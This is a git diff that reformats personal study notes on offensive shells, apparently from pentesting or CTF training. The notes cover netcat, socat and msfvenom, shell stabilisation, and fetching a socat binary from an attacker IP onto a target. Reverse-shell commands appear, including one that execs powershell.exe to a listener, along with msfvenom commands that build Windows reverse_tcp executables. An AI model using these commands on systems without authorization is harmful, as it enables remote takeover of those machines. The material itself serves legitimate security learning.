@@ -1,23 +1,26 @@
 Netcat
+
 Socat
+
 MSF auxiliary/multi/handler
+
 MSF venom
-https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
-https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+[Payload of all things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+
+[Pentest Monkey](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+
 /usr/share/webshells
 
-
-
-
-2 types
-Reverse
-Bind 
+2 types of shells
+- Reverse
+- Bind 
 
 
 
 
 
-Shell Stabilisation
+# Shell Stabilisation
 
 
 ```
@@ -55,26 +58,27 @@ Back in our own terminal we use
 ```stty raw -echo; fg```
 
 This does two things: 
+
 	first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). 
 	It then foregrounds the shell, thus completing the process. 
 
 Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type reset and press enter.
 
-
+```
 stty -a 	(new terminal  // size you want)  then set:
 stty rows <number>
 stty cols <number>
+```
 
 
 
+# rlwrap (good for windows)
 
-
-rlwrap (good for windows)
-
+```
 sudo apt install rlwrap
 
 rlwrap nc -lvnp <port>
-
+```
 linux use Ctrl + Z then stty raw -echo; fg
 
 stty -a 	(new terminal  // size you want)  then set:
@@ -86,22 +90,24 @@ stty cols <number>
 
 
 
-Socat 
+# Socat 
 
-serve this file on py server:
+serve this [file](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) on py server:
 
-sudo python3 -m http.server 80
+`sudo python3 -m http.server 80`
 
-https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true
+
 
 
 upload from host:
 
-linux:
-wget 10.6.65.43/socat -O /tmp/socat
+**linux**:
 
-windows:
-Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe
+`wget 10.6.65.43/socat -O /tmp/socat`
+
+**windows**:
+
+`Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`
 
 stty -a 	(new terminal  // size you want)  then set:
 stty rows <number>
@@ -116,15 +122,15 @@ stty cols <number>
 
 
 
-Socat 101
+## Socat 101
 
 
 Reverse Shell
 
-listen:
+**listen**:
 socat TCP-L:443 -
 
-connect:
+**connect**:
 windows:
 socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
 
@@ -237,7 +243,7 @@ needs to be one line:
 
 
 
-msfvennom
+### msfvenom
 
 ```msfvenom -p <PAYLOAD> <OPTIONS>```
 
@@ -245,10 +251,10 @@ msfvennom
 ```msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>```
 
 
-staged - good for ids detection, first stage just connects, second stage downloads code
+**staged**- good for ids detection, first stage just connects, second stage downloads code
 
 
-stageless - most common, all in one, 
+**stageless** - most common, all in one, 
 
 meterpreter shell  -  must be used in msf, banned from certain certifications
 
@@ -259,43 +265,12 @@ meterpreter shell  -  must be used in msf, banned from certain certifications
 linux/x86/shell_reverse_tcp
 
 
-camel case = stageless
+camel case = **stageless**
 
-backslash = staged
+backslash = **staged**
 
 
 
 ```msfvenom --list payloads | grep "<OS>/<arch>/<payload>"```
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 
